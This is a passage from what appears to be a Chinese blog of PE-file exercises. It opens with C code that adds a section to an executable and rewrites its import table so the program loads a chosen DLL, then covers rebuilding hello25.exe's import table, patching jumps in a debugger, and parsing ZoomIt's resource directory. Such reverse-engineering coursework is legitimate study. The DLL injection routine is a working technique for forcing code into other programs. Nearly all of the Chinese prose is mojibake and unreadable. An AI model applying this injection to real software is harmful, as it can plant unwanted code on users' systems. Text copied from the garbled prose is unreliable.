LastSection-&gt;Misc.VirtualSize &gt; LastSection-&gt;SizeOfRawData ? LastSection-&gt;Misc.VirtualSize : LastSection-&gt;SizeOfRawData;<br><br>    NewSection-&gt;VirtualAddress = LastSection-&gt;VirtualAddress + add_size;<br><br>    <span class="hljs-comment">//æ‰¾åˆ°å¼€å§‹çš„åœ°æ–¹</span><br>    <span class="hljs-keyword">if</span> (NewSection-&gt;VirtualAddress % OptionalHeader-&gt;SectionAlignment)<br>&#123;<br>NewSection-&gt;VirtualAddress = NewSection-&gt;VirtualAddress / OptionalHeader-&gt;SectionAlignment * OptionalHeader-&gt;SectionAlignment +OptionalHeader-&gt;SectionAlignment;<br>&#125;<br><br>NewSection-&gt;Characteristics = <span class="hljs-number">0xC0000040</span>;<br><br>    <span class="hljs-keyword">return</span> NewBuffer;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">DLL_INJECT</span><span class="hljs-params">(<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER32 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">//åˆå§‹åŒ–PEå¤´éƒ¨ä¿¡æ¯</span><br>DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>NTHeader = (PIMAGE_NT_HEADERS)(Buffer + DosHeader-&gt;e_lfanew);<br>FILEHeader = (PIMAGE_FILE_HEADER)(Buffer+DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER32)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br><br>    <span class="hljs-comment">//å®šä½åˆ°æ–°èŠ‚åŒºå¼€å§‹</span><br>    PIMAGE_SECTION_HEADER NewSec = SectionHeader + FILEHeader-&gt;NumberOfSections - <span class="hljs-number">1</span>;<br>    <span class="hljs-type">char</span>* pNewSec = Buffer + NewSec-&gt;PointerToRawData;<br>    <span class="hljs-comment">//å®šä½åˆ°å¯¼å…¥è¡¨</span><br>    DWORD Import_Rva = OptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;<br>    DWORD Import_Foa = RVA_TO_FOA(Import_Rva,Buffer);<br>   <br>    PIMAGE_IMPORT_DESCRIPTOR pImport_Table =(PIMAGE_IMPORT_DESCRIPTOR)(Buffer + Import_Foa);<br>    <span class="hljs-comment">// printf(&quot;%d&quot;,OptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size);</span><br><br>    <span class="hljs-comment">//å¤åˆ¶åŸå¯¼å…¥è¡¨</span><br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(pImport_Table-&gt;FirstThunk)&#123;<br>        <span class="hljs-built_in">memcpy</span>(pNewSec + <span class="hljs-number">20</span>*index,(pImport_Table),<span class="hljs-number">20</span>);<br>        pImport_Table++;<br>        index++;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;name:%s\n&quot;</span>,(RVA_TO_FOA(pImport_Table-&gt;Name,Buffer)+Buffer));<br>    &#125;<br><br>    <span class="hljs-comment">//æŒ‡å‘æ–°å¤åˆ¶å¯¼å…¥è¡¨ç»“æŸ</span><br>    PIMAGE_IMPORT_DESCRIPTOR New_Import = PIMAGE_IMPORT_DESCRIPTOR(pNewSec + index * <span class="hljs-number">20</span>);<br><br>    <span class="hljs-comment">//æ–°å¢INTè¡¨</span><br>    DWORD* New_INT = (DWORD*)(pNewSec + index * <span class="hljs-number">20</span>+ <span class="hljs-number">40</span>);<br>    <span class="hljs-comment">//æ–°å¢IATè¡¨</span><br>    DWORD* New_IAT =(DWORD*)(pNewSec + index * <span class="hljs-number">20</span> + <span class="hljs-number">48</span>);<br><br>    <span class="hljs-comment">//æ–°å¢IMAGE_IMPORT_BY_NAMEç»“æ„</span><br>    PIMAGE_IMPORT_BY_NAME New_NAME = PIMAGE_IMPORT_BY_NAME(pNewSec + index * <span class="hljs-number">20</span> + <span class="hljs-number">56</span>);<br><br>    <span class="hljs-built_in">memcpy</span>(New_NAME-&gt;Name,<span class="hljs-string">&quot;THE_FUNC_YOUR_DLL_EXPORT&quot;</span>,THE_LEGTH_OF_THE_FUNC);<br><br>    *New_INT = FOA_TO_RVA((<span class="hljs-type">char</span>*)New_NAME - Buffer,Buffer);<br>    <span class="hljs-comment">//printf(&quot;%x&quot;,*(New_INT));</span><br>    *New_IAT = FOA_TO_RVA((<span class="hljs-type">char</span>*)New_NAME - Buffer,Buffer);<br>    <span class="hljs-comment">//printf(&quot;%x&quot;,*(New_INT + 2));</span><br><br>    New_Import-&gt;OriginalFirstThunk = FOA_TO_RVA(((<span class="hljs-type">char</span>*)New_INT - Buffer),Buffer);<br>    New_Import-&gt;FirstThunk = FOA_TO_RVA((<span class="hljs-type">char</span>*)New_IAT - Buffer,Buffer);<br><br>    <span class="hljs-type">char</span>* New_DLL_NAME = pNewSec + index * <span class="hljs-number">20</span> + <span class="hljs-number">100</span>;<br>    <span class="hljs-built_in">memcpy</span>(New_DLL_NAME,<span class="hljs-string">&quot;YOU_DLL_NAME&quot;</span>,YOUR_DLL_NAME_LENGTH_PLUS_1);<br><br>    New_Import-&gt;Name = FOA_TO_RVA(New_DLL_NAME - Buffer,Buffer);<br><br><br>    OptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = NewSec-&gt;VirtualAddress;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span>* buffer;<br>    <span class="hljs-type">char</span>* new_buffer;<br><br>    FILE* fp1 = <span class="hljs-literal">NULL</span>;<br>    FILE* fp2 = <span class="hljs-literal">NULL</span>;<br>    <br>    <span class="hljs-type">errno_t</span> err_1 = fopen_s(&amp;fp1, <span class="hljs-string">&quot;YOUR_PATH_TO_EXE&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <span class="hljs-type">errno_t</span> err_2 = fopen_s(&amp;fp2, <span class="hljs-string">&quot;YOUR_PATH_TO_EXE_PATHCHED&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>);<br><br>    DWORD size = Size(fp1);<br>    buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);<br>    fread(buffer,size,<span class="hljs-number">1</span>,fp1);<br><br>    new_buffer = Section_add(fp1,buffer);<br>    DLL_INJECT(new_buffer);<br><br>    fwrite(new_buffer,size+ADD_SIZE,<span class="hljs-number">1</span>,fp2);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;   <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="6-é¦–å…ˆåˆ é™¤hello25-exeå¼•å…¥å‡½æ•°èŠ‚æ‰€æœ‰æ•°æ®ï¼Œç„¶åå°†æ‰€æœ‰å¼•å…¥çš„DLLåå­—åŠå‡½æ•°åé‡æ–°å®šä¹‰åœ¨å¼•å…¥å‡½æ•°èŠ‚å¼€å§‹éƒ¨åˆ†ï¼Œä¹‹åç»§ç»­ä¿®æ”¹å¼•å…¥å‡½æ•°èŠ‚å…¶ä»–éƒ¨åˆ†ï¼ˆéœ€è¦æ—¶å¯å†ä¿®æ”¹DataDirectoryç›¸å…³é¡¹ï¼‰ï¼Œä½¿å¾—è¯¥ç¨‹åºå†æ¬¡æ¢å¤åŸæœ‰åŠŸèƒ½ã€‚"><a href="#6-é¦–å…ˆåˆ é™¤hello25-exeå¼•å…¥å‡½æ•°èŠ‚æ‰€æœ‰æ•°æ®ï¼Œç„¶åå°†æ‰€æœ‰å¼•å…¥çš„DLLåå­—åŠå‡½æ•°åé‡æ–°å®šä¹‰åœ¨å¼•å…¥å‡½æ•°èŠ‚å¼€å§‹éƒ¨åˆ†ï¼Œä¹‹åç»§ç»­ä¿®æ”¹å¼•å…¥å‡½æ•°èŠ‚å…¶ä»–éƒ¨åˆ†ï¼ˆéœ€è¦æ—¶å¯å†ä¿®æ”¹DataDirectoryç›¸å…³é¡¹ï¼‰ï¼Œä½¿å¾—è¯¥ç¨‹åºå†æ¬¡æ¢å¤åŸæœ‰åŠŸèƒ½ã€‚" class="headerlink" title="6.é¦–å…ˆåˆ é™¤hello25.exeå¼•å…¥å‡½æ•°èŠ‚æ‰€æœ‰æ•°æ®ï¼Œç„¶åå°†æ‰€æœ‰å¼•å…¥çš„DLLåå­—åŠå‡½æ•°åé‡æ–°å®šä¹‰åœ¨å¼•å…¥å‡½æ•°èŠ‚å¼€å§‹éƒ¨åˆ†ï¼Œä¹‹åç»§ç»­ä¿®æ”¹å¼•å…¥å‡½æ•°èŠ‚å…¶ä»–éƒ¨åˆ†ï¼ˆéœ€è¦æ—¶å¯å†ä¿®æ”¹DataDirectoryç›¸å…³é¡¹ï¼‰ï¼Œä½¿å¾—è¯¥ç¨‹åºå†æ¬¡æ¢å¤åŸæœ‰åŠŸèƒ½ã€‚"></a>6.é¦–å…ˆåˆ é™¤hello25.exeå¼•å…¥å‡½æ•°èŠ‚æ‰€æœ‰æ•°æ®ï¼Œç„¶åå°†æ‰€æœ‰å¼•å…¥çš„DLLåå­—åŠå‡½æ•°åé‡æ–°å®šä¹‰åœ¨å¼•å…¥å‡½æ•°èŠ‚å¼€å§‹éƒ¨åˆ†ï¼Œä¹‹åç»§ç»­ä¿®æ”¹å¼•å…¥å‡½æ•°èŠ‚å…¶ä»–éƒ¨åˆ†ï¼ˆéœ€è¦æ—¶å¯å†ä¿®æ”¹DataDirectoryç›¸å…³é¡¹ï¼‰ï¼Œä½¿å¾—è¯¥ç¨‹åºå†æ¬¡æ¢å¤åŸæœ‰åŠŸèƒ½ã€‚</h3><p>è¿™é¢˜æ˜ç¡®è¦æ±‚æˆ‘ä»¬åˆ é™¤å¯¼å…¥è¡¨çš„æ‰€æœ‰æ•°æ®ï¼Œç„¶åå†è‡ªå·±é‡æ„ä¸€ä¸ªå¯¼å…¥è¡¨ï¼Œè¿™å°±è¦æ±‚æˆ‘ä»¬å¯¹å¯¼å…¥è¡¨æœ‰ä¸€ä¸ªæ¯”è¾ƒå……åˆ†çš„è®¤è¯†ã€‚</p><p>å¦‚æœä½ è®¤è®¤çœŸçœŸçœ‹äº†ç¬¬å››é¢˜ï¼Œå¹¶ä¸”åŠ¨æ‰‹æ“ä½œè¿‡ï¼Œé‚£ä¹ˆè¿™é¢˜æˆ‘ç›¸ä¿¡ä½ ä¹Ÿä¸€å®šåšå¾—å‡ºæ¥:)</p><p>é¦–å…ˆæˆ‘ä»¬è¿˜æ˜¯å®šä½åˆ°å¯¼å…¥è¡¨çš„ä½ç½®</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20225124.png"></p><p>è¿™é‡Œå†è´´å‡ºä¸å¯¼å…¥è¡¨ç›¸å…³çš„æ‰€æœ‰æ•°æ®</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20020535.png"></p><p>å…¶å®è¿™é‡Œé¢æœ€é‡è¦çš„æ˜¯é‚£äº›å­—ç¬¦ä¸²æ•°æ®ï¼Œå…¶ä»–çš„éƒ½æ˜¯åœ°å€æˆ‘ä»¬éƒ½å¯ä»¥ä¸€ä¸ªä¸€ä¸ªè®¡ç®—å‡ºæ¥ã€‚</p><p>ç°åœ¨è®©æˆ‘ä»¬å°è¯•é‡æ„ä¸€ä¸ªå¯¼å…¥è¡¨å§</p><p>æˆ‘ä»¬å…ˆå¤åˆ¶è¿™äº›å­—ç¬¦ä¸²</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20020744.png"></p><p>ç„¶ååœ¨ä¸‹é¢å¡«å…¥å¯¼å…¥è¡¨ç»“æ„ï¼Œæœ‰ä¸¤ä¸ªdllï¼Œæ‰€ä»¥éœ€è¦ä¸¤ä¸ªå¯¼å…¥è¡¨ï¼Œå…¶ä¸­æ¯å¼ è¡¨çš„INTè¿˜æœ‰IATæˆ‘ä»¬ç°åœ¨æ˜¯ä¸çŸ¥é“çš„ï¼Œé‚£å°±ç´¢æ€§å¡«é›¶ï¼Œå…ˆç©ºç€</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20021105.png"></p><p>è¿™é‡Œç›´æ¥ç©ºä¸€è¡Œåœ¨<code>0x700</code>å¼€å§‹ï¼Œä¸€æ–¹é¢æ˜¯å› ä¸ºè¦é˜»æ–­<code>uer32.dll</code>å­—ç¬¦ä¸²ï¼Œä¸€æ–¹é¢æ˜¯æ–¹ä¾¿è®¡ç®—</p><p>å¦‚å›¾å¡«å…¥ä¸¤å¼ å¯¼å…¥è¡¨å…±è®¡10ä¸ªDWORDï¼Œå…¶ä¸­dllåå­—æˆ‘ä»¬æ˜¯å¯ä»¥è®¡ç®—çš„ï¼Œåˆ©ç”¨FOAè½¬RVAå³å¯</p><p>æ¥ä¸‹æ¥å°±éœ€è¦è¡¥å……æ¯å¼ è¡¨å„è‡ªçš„INTå’ŒIATäº†ï¼Œæ‰€è°“çš„INTå’ŒIATï¼Œå…¶å…·ä½“é¡¹éƒ½æ˜¯ä¸€ä¸ªDWORDï¼ŒæŒ‡å‘å¦å¤–ä¸€ä¸ªç»“æ„ä½“<code> _IMAGE_IMPORT_BY_NAME</code>ï¼Œè¿™ä¸ªç»“æ„ä½“ç”±ä¸€ä¸ªWORDå‹æ•°æ®å’Œå­—ç¬¦ä¸²æ•°æ®ç»„æˆï¼Œå­—ç¬¦ä¸²ä¹Ÿå°±æ˜¯å…·ä½“å‡½æ•°åï¼Œå³æˆ‘ä»¬åˆšåˆšæ‰€å¤åˆ¶çš„</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20021718.png"></p><p>NOTEï¼šå§‹ç»ˆè¦è®°ä½ï¼Œæ¯ä¸€å¼ è¡¨ç»“æŸçš„æ ‡å¿—éƒ½æ˜¯åŒç­‰å¤§å°ï¼ˆå³æ¯ä¸€é¡¹æ˜¯4å­—èŠ‚å¤§å°ï¼Œåˆ™è‡³å°‘æœ‰4å­—èŠ‚å…¨0ï¼‰çš„å…¨0ç»“æ„ï¼Œè¿™é‡Œæˆ‘å°±ç›´æ¥ç©ºè¡Œä»¥æ–¹ä¾¿è®¡ç®—</p><p>ç¨å¾®è§£é‡Šä¸€ä¸‹ï¼Œè¿™é‡Œ<code>0x740</code>å¤„çš„<code>B0 20 00 00</code>æ˜¯ä½œä¸ºç¬¬ä¸€å¼ è¡¨çš„INTï¼Œå®ƒæŒ‡å‘FOA<code>6B0</code>çš„æ•°æ®<code>80 00 45 78 69 74 50 72 6F 63 65 73 73</code>ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªWORDå‹æ•°æ®åŠ ä¸€ä¸ªå­—ç¬¦ä¸²çš„æ•°æ®ç±»å‹,ç„¶åç©º4å­—èŠ‚ä½œä¸ºINTçš„ç»“æŸï¼Œç„¶åæ˜¯IATè¡¨ï¼Œå…¶å€¼ä¸INTä¸€æ ·ã€‚</p><p>ä¸‹é¢<code>0x750</code>ï¼Œ<code>0x760</code>ä¸¤è¡Œä¹Ÿæ˜¯ä¸€æ ·</p><p>æœ‰äº†INTå’ŒIATå°±å¯ä»¥å¡«å…¥å¯¼å…¥è¡¨ç»“æ„äº†</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20022243.png"></p><p>æœ€ååˆ«å¿˜äº†ä¿®æ”¹æ•°æ®ç›®å½•é¡¹çš„å¯¼å…¥è¡¨åœ°å€</p><p>å½“ä½ æ¬£å–œåšå®Œè¿™ä¸€åˆ‡çš„æ—¶å€™ï¼Œä½ ä¼šå‘ç°ä½ æ— æ³•è¿è¡Œä½ çš„exeï¼Œå³ä½¿ä½ ä½¿ç”¨PEç›¸å…³å·¥å…·å·²ç»èƒ½å¤ŸæˆåŠŸè§£æå¯¼å…¥è¡¨æ•°æ®</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20022441.png"></p><p>ä¸çŸ¥ä½ æ˜¯å¦è¿˜è®°å¾—åœ¨é—®é¢˜4åšçš„å°å®éªŒï¼Œç¨‹åºåœ¨è°ƒç”¨ç³»ç»Ÿå‡½æ•°æ˜¯ç›´æ¥è°ƒç”¨ç³»ç»Ÿå‡½æ•°å—ï¼Ÿ</p><p>å…¶å®ä¸æ˜¯ï¼Œæ˜¯é€šè¿‡jmpå»IATè¡¨æ¥è°ƒç”¨ç³»ç»Ÿå‡½æ•°ï¼Œç¨‹åºåœ¨è£…è¿›å†…å­˜ä¸­æ—¶ï¼Œæ“ä½œç³»ç»Ÿå°±ä¼šæŠŠè¦ç”¨åˆ°çš„å…¶ä»–DLLå‡½æ•°ä¸€é¡¹ä¸€é¡¹å¡«å…¥IATè¡¨ï¼ˆå›å¿†PEæ–‡ä»¶è£…è½½è¿‡ç¨‹ï¼‰</p><p>è®©æˆ‘ä»¬æŠŠç¨‹åºä¸¢å»x32dbgæŸ¥çœ‹ï¼Œå¹¶è½¬å»æŸ¥çœ‹å†…å­˜<code>0x4021000</code>(å¯¼å…¥è¡¨çš„ä½ç½®)</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20022935.png"></p><p>å¯ä»¥å‘ç°ç”»äº†çº¢çº¿çš„åœ°æ–¹ï¼Œå°±æ˜¯IATçš„åœ°æ–¹ï¼Œå¯ä»¥å†å»æ‰¾æ‰¾<code>MessageBoxA</code>å‡½æ•°åœ°å€ï¼Œä¸€å®šå°±æ˜¯åœ¨è¿™é‡Œé¢</p><p>å†æ¥çœ‹çœ‹æ±‡ç¼–ä»£ç </p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20023113.png"></p><p>æœç„¶å‡ºé—®é¢˜äº†ï¼Œä¸‹é¢çš„ä¸‰ä¸ªjmpä¸çŸ¥é“jmpå»äº†å“ªé‡Œã€‚</p><p>è¿™æ˜¯å› ä¸ºåœ¨æ²¡æœ‰æ”¹ä¹‹å‰ï¼Œè¿™ä¸‰ä¸ªjmpæ˜¯jmpå»IATè¡¨çš„ï¼Œè€ŒIATè¡¨æ˜¯å­˜æ”¾äº†å‡½æ•°åœ°å€çš„ï¼Œé‚£æˆ‘ä»¬ç°åœ¨éƒ½æŠŠIATè¡¨æ”¹äº†ï¼Œè¿™é‡Œè·³è½¬çš„åœ°å€å´æ²¡æœ‰æ”¹ï¼Œå½“ç„¶æ— æ³•è¿è¡Œã€‚å› æ­¤è¿™é‡Œåªéœ€è¦æ”¹ä¸€æ”¹jmpçš„åœ°å€å°±å¯ä»¥äº†ï¼ˆé‡å®šä½è¡¨å°±å¹²è¿™äº‹å„¿ç”¨çš„ï¼‰</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20023409.png"></p><p>(Patchæµç¨‹ï¼šå³é”®-&gt;æ±‡ç¼–ï¼›å¦‚æœä½ æ‡‚å¾—ä¸€ç‚¹æ±‡ç¼–ä»£ç ï¼Œé‚£ä¹ˆè¿™ä¼šæ˜¯éå¸¸ç®€å•çš„é—®é¢˜ï¼›å½“ç„¶æ±‡ç¼–ä¹Ÿä¸æ˜¯ä»€ä¹ˆéš¾äº‹)</p><p>ç°åœ¨ç¨‹åºå°±å¯ä»¥æ­£å¸¸è¿è¡Œå•¦~</p><h3 id="7-ä½¿ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨æå–ZoomItç¨‹åºä¸­å°ºå¯¸æœ€å¤§çš„å›¾æ ‡ï¼Œå¹¶å­˜å‚¨ä¸º-icoæ–‡ä»¶ï¼Œç¡®è®¤icoæ–‡ä»¶æ‰“å¼€å¯æ˜¾ç¤ºå¯¹åº”å›¾æ ‡ã€‚"><a href="#7-ä½¿ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨æå–ZoomItç¨‹åºä¸­å°ºå¯¸æœ€å¤§çš„å›¾æ ‡ï¼Œå¹¶å­˜å‚¨ä¸º-icoæ–‡ä»¶ï¼Œç¡®è®¤icoæ–‡ä»¶æ‰“å¼€å¯æ˜¾ç¤ºå¯¹åº”å›¾æ ‡ã€‚" class="headerlink" title="7.ä½¿ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨æå–ZoomItç¨‹åºä¸­å°ºå¯¸æœ€å¤§çš„å›¾æ ‡ï¼Œå¹¶å­˜å‚¨ä¸º.icoæ–‡ä»¶ï¼Œç¡®è®¤icoæ–‡ä»¶æ‰“å¼€å¯æ˜¾ç¤ºå¯¹åº”å›¾æ ‡ã€‚"></a>7.ä½¿ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨æå–ZoomItç¨‹åºä¸­å°ºå¯¸æœ€å¤§çš„å›¾æ ‡ï¼Œå¹¶å­˜å‚¨ä¸º.icoæ–‡ä»¶ï¼Œç¡®è®¤icoæ–‡ä»¶æ‰“å¼€å¯æ˜¾ç¤ºå¯¹åº”å›¾æ ‡ã€‚</h3><p>é¦–å…ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡æ•°æ®ç›®å½•é¡¹çš„ç¬¬ä¸‰é¡¹æ‰¾åˆ°èµ„æºè¡¨ä½ç½®ï¼Œè¿™é‡Œç›´æ¥ä½¿ç”¨PEæŸ¥çœ‹å™¨å¯»æ‰¾</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20095150.png"></p><p>å¯ä»¥çœ‹åˆ°èµ„æºè¡¨åœ¨æ–‡ä»¶åç§»67E00å¤„ï¼Œè½¬å»16è¿›åˆ¶ç¼–è¾‘å™¨æŸ¥çœ‹</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20095325.png"></p><p>ç°åœ¨å°±éœ€è¦çŸ¥é“PEæ–‡ä»¶èµ„æºçš„ç¼–æ’æ–¹å¼</p><p>ç®€å•æ¥è¯´</p><p>PE æ–‡ä»¶ä¸­çš„èµ„æºæ˜¯æŒ‰ç…§ èµ„æºç±»å‹ -&gt; èµ„æºID -&gt; èµ„æºä»£ç é¡µ çš„3å±‚æ ‘å‹ç›®å½•ç»“æ„æ¥ç»„ç»‡èµ„æºçš„ï¼Œé€šè¿‡å±‚å±‚ç´¢å¼•æ‰èƒ½å¤Ÿè¿›å…¥ç›¸åº”çš„å­ç›®å½•æ‰¾åˆ°æ­£ç¡®çš„èµ„æºã€‚</p><p>æ¯ä¸€å±‚éƒ½æ˜¯ä»¥IMAGE_RESOURCE_DIRECTORYç»“æ„ä¸ºå¤´éƒ¨çš„ï¼Œå¹¶ä¸”åé¢è·Ÿç€ä¸€ä¸ªIMAGE_RESOURCE_DIRECTORY_ENTRYç»“æ„æ•°ç»„ã€‚å…¶ä¸­IMAGE_RESOURCE_DIRECTORYè´Ÿè´£æŒ‡å‡ºåé¢æ•°ç»„ä¸­çš„æˆå‘˜ä¸ªæ•°ï¼ŒIMAGE_RESOURCE_DIRECTORY_ENTRYæ•°ç»„æˆå‘˜åˆ†åˆ«æŒ‡å‘ä¸‹ä¸€å±‚ç›®å½•ç»“æ„ã€‚</p><p><img src="https://tse2-mm.cn.bing.net/th/id/OIP-C.hou04PHNnyDzQ7tAY1SovwHaE0?w=287&h=187&c=7&r=0&o=5&dpr=2&pid=1.7"></p><p>ç»“æ„IMAGE_RESOURCE_DIRECTORYå®šä¹‰å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_RESOURCE_DIRECTORY</span> &#123;</span><br>    DWORD   Characteristics;      <span class="hljs-comment">//å±æ€§ï¼Œä¸€èˆ¬ä¸º0</span><br>    DWORD   TimeDateStamp;        <span class="hljs-comment">//èµ„æºçš„äº§ç”Ÿæ—¶åˆ»ï¼Œä¸€èˆ¬ä¸º0</span><br>    WORD    MajorVersion;         <span class="hljs-comment">//ä¸»ç‰ˆæœ¬å·ï¼Œä¸€èˆ¬ä¸º0</span><br>    WORD    MinorVersion;         <span class="hljs-comment">//æ¬¡ç‰ˆæœ¬å·ï¼Œä¸€èˆ¬ä¸º0</span><br>    WORD    NumberOfNamedEntries; <span class="hljs-comment">//ä»¥åç§°ï¼ˆå­—ç¬¦ä¸²ï¼‰å‘½åçš„èµ„æºæ•°é‡</span><br>    WORD    NumberOfIdEntries;    <span class="hljs-comment">//ä»¥IDï¼ˆæ•´å‹æ•°å­—ï¼‰å‘½åçš„èµ„æºæ•°é‡</span><br>&#125; IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;<br> <br></code></pre></td></tr></table></figure><p>IMAGE_RESOURCE_DIRECTORY_ENTRYå®šä¹‰å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_RESOURCE_DIRECTORY_ENTRY</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>            DWORD NameOffset:<span class="hljs-number">31</span>;<br>            DWORD NameIsString:<span class="hljs-number">1</span>;<br>        &#125;;<br>        DWORD   Name;<br>        WORD    Id;<br>    &#125;;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        DWORD   OffsetToData;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>            DWORD   OffsetToDirectory:<span class="hljs-number">31</span>;<br>            DWORD   DataIsDirectory:<span class="hljs-number">1</span>;<br>        &#125;;<br>    &#125;;<br>&#125; <br></code></pre></td></tr></table></figure><p>çœ‹ç€å¾ˆå¤§å…¶å®å°±æ˜¯2ä¸ªDWORDå¤§å°ï¼Œä¹Ÿå°±8å­—èŠ‚ï¼ˆstructçš„è¯­æ³•æ„æ€ä¸ºåˆ†é…ä¸€ä¸ªDWORDå¤§å°ï¼Œå…¶ä¸­æœ€é«˜ä½åšNameIsStringï¼Œä½31ä½åšNameOffsetï¼‰</p><h4 id="ç¬¬ä¸€å±‚ï¼š"><a href="#ç¬¬ä¸€å±‚ï¼š" class="headerlink" title="ç¬¬ä¸€å±‚ï¼š"></a>ç¬¬ä¸€å±‚ï¼š</h4><p>ç°åœ¨å°±ä¸€å±‚ä¸€å±‚çš„æ¥æ‰¾ï¼Œç¬¬ä¸€å±‚æ•°æ®å¦‚ä¸‹</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20095947.png"></p><p>çº¢è‰²æ¡†æ˜¯ç»“æ„<code>_IMAGE_RESOURCE_DIRECTORY</code>ï¼Œå¯çŸ¥<code>NumberOfNamedEntries</code>ä¸º1ï¼Œ<code>NumberOfIdEntries</code>ä¸º8ï¼Œä¸¤è€…åŠ èµ·æ¥å°±æ˜¯ç»“æ„<code>_IMAGE_RESOURCE_DIRECTORY_ENTRY </code>æ•°é‡ï¼Œæ‰€ä»¥åé¢å°±æœ‰9ä¸ª<code>_IMAGE_RESOURCE_DIRECTORY_ENTRY </code>ç»“æ„ï¼Œä¹Ÿå³ç»¿è‰²æ–¹æ¡†çš„å†…å®¹</p><p>å†ä½¿ç”¨<code>_IMAGE_RESOURCE_DIRECTORY_ENTRY 